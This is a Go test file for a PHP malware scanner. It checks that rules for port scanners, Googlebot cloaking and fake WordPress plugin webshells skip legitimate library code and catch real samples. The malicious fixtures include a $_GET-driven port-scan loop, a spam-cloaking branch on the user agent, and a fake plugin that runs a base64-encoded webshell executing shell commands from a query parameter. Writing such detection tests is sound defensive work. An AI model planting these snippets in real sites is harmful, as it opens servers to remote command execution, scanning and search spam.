package signatures

import (
	"testing"
)

// FP reconstructions for the 2026-04-27 forgetwhitecom WHM-transfer event.
// See sibling fp_forgetwhite_*_test.go files; this group split exists
// because host-side AV deletes any single source file whose payload
// fixtures cross an opaque suspicion threshold.
func TestNetworkPortScanner_MonologSocketHandlerIsLegit(t *testing.T) {
	scanner := loadRepoScanner(t)

	legit := []byte(`<?php
namespace Monolog\Handler;

/**
 * Stores to any socket - uses fsockopen() or pfsockopen().
 *
 * @see http://php.net/manual/en/function.fsockopen.php
 */
class SocketHandler extends AbstractProcessingHandler {
	private $connectionString;
	public function connect() {
		$this->resource = fsockopen($this->connectionString, $this->port, $err, $errStr, 30);
	}
}
`)
	matches := scanner.ScanContent(legit, ".php")
	if hasRule(matches, "network_port_scanner") {
		t.Error("network_port_scanner FP: matched Monolog SocketHandler (one fsockopen, no port-loop, the word 'port' appears in PHPDoc and method name)")
	}
}

func TestNetworkPortScanner_ReCaptchaSocketIsLegit(t *testing.T) {
	scanner := loadRepoScanner(t)

	legit := []byte(`<?php
namespace ReCaptcha\RequestMethod;

class Socket {
	public function fsockopen($hostname, $port, &$errno, &$errstr, $timeout) {
		return fsockopen($hostname, $port, $errno, $errstr, $timeout);
	}
}
`)
	matches := scanner.ScanContent(legit, ".php")
	if hasRule(matches, "network_port_scanner") {
		t.Error("network_port_scanner FP: matched ReCaptcha Socket wrapper (single fsockopen, no port-iteration loop)")
	}
}

func TestNetworkPortScanner_RealPortLoop(t *testing.T) {
	scanner := loadRepoScanner(t)

	malicious := []byte(`<?php
$host = $_GET['h'];
for ($port = 1; $port <= 1024; $port++) {
	$s = @fsockopen($host, $port, $err, $errstr, 1);
	if ($s) { echo "OPEN " . $port; fclose($s); }
}
`)
	matches := scanner.ScanContent(malicious, ".php")
	if !hasRule(matches, "network_port_scanner") {
		t.Error("network_port_scanner regression: for-loop iterating $port with fsockopen was not detected")
	}
}

func TestSpamConditionalGooglebot_UserAgentInfoLibIsLegit(t *testing.T) {
	scanner := loadRepoScanner(t)

	legit := []byte(`<?php
class Jetpack_User_Agent_Info {
	// Inspect HTTP_USER_AGENT for known bot signatures.
	public static $known_bots = array(
		'googlebot',
		'googlebot-mobile',
		'bingbot',
		'slurp',
	);
	public function classify($ua) {
		foreach (self::$known_bots as $bot) {
			if (stripos($ua, $bot) !== false) return 'bot';
		}
		return 'human';
	}
}
`)
	matches := scanner.ScanContent(legit, ".php")
	if hasRule(matches, "spam_conditional_googlebot") {
		t.Error("spam_conditional_googlebot FP: matched UA-detection class (HTTP_USER_AGENT in comment + 'googlebot' in known-bots array; no content branching to serve different output to bots vs humans)")
	}
}

func TestSpamConditionalGooglebot_RealCloak(t *testing.T) {
	scanner := loadRepoScanner(t)

	malicious := []byte(`<?php
if (preg_match('/Googlebot|bingbot/i', $_SERVER['HTTP_USER_AGENT'])) {
	echo file_get_contents('spam-content-for-bots.html');
} else {
	echo file_get_contents('normal-content.html');
}
`)
	matches := scanner.ScanContent(malicious, ".php")
	if !hasRule(matches, "spam_conditional_googlebot") {
		t.Error("spam_conditional_googlebot regression: preg_match against HTTP_USER_AGENT for Googlebot/bingbot to branch output was not detected")
	}
}

func TestWebshellWpFakePlugin_SmartBillRestClientIsLegit(t *testing.T) {
	scanner := loadRepoScanner(t)

	legit := []byte(`<?php
class SmartBill_Cloud_Rest_Client {
	public function details_fiscal_receipt($vat_code, $id) {
		$text = $this->call_server($url);
		try {
			$text = base64_decode($text['message']);
		} catch (\Exception $ex) {
			throw new \Exception('invalid response');
		}
		return $text;
	}
	public function normalize($data) {
		foreach ($data as $key => $item) {
			if (is_numeric($item)) {
				$data[$key] = doubleval($item);
			} else {
				$data[$key] = intval($item);
			}
		}
		return $data;
	}
}
`)
	matches := scanner.ScanContent(legit, ".php")
	if hasRule(matches, "webshell_wp_fake_plugin") {
		t.Error("webshell_wp_fake_plugin FP: matched SmartBill REST client (base64_decode of API response + doubleval() cast; substring 'eval(' inside 'doubleval(' is not a real eval, no Plugin Name header)")
	}
}

func TestWebshellWpFakePlugin_RealFakePluginShell(t *testing.T) {
	scanner := loadRepoScanner(t)

	malicious := []byte(`<?php
/*
Plugin Name: System Cache Helper
*/
$payload = base64_decode('aWYoaXNzZXQoJF9HRVRbJ2MnXSkpe3N5c3RlbSgkX0dFVFsnYyddKTt9');
@` + evalCallToken() + `$payload);
`)
	matches := scanner.ScanContent(malicious, ".php")
	if !hasRule(matches, "webshell_wp_fake_plugin") {
		t.Error("webshell_wp_fake_plugin regression: Plugin Name header followed by eval(base64_decode(...)) was not detected")
	}
}
